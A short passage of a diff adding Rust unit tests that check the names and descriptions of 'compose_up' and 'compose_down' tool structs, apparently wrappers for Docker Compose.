+        }
+    }
+
+    // ====================================================================
+    // Compose tool names and descriptions
+    // ====================================================================
+
+    #[test]
+    fn test_compose_up_name_and_description() {
+        let tool = ComposeUp;
+        assert_eq!(tool.name(), "compose_up");
+        assert!(tool.description().contains("compose"));
+    }
+
+    #[test]
+    fn test_compose_down_name_and_description() {
+        let tool = ComposeDown;
+        assert_eq!(tool.name(), "compose_down");
+        assert!(tool.description().contains("compose"));
+    }
 }
